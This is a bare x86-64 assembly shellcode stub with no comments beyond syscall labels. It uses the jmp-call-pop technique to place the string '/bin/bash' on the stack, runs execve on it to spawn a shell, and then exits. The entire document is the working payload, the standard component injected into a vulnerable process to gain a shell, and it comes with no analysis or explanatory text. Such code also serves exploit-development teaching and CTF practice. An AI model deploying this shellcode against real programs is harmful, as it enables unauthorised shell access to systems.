global _start

section .text
_start:
jmp GetShellPath

SysExecve:
pop rdi
xor rax, rax
mov rsi, rax
mov rdx, rax
mov al, 59 ; sys_execve
syscall

xor rax, rax
mov rdi, rax
mov al, 60
syscall

GetShellPath:
call SysExecve
db '/bin/bash', 0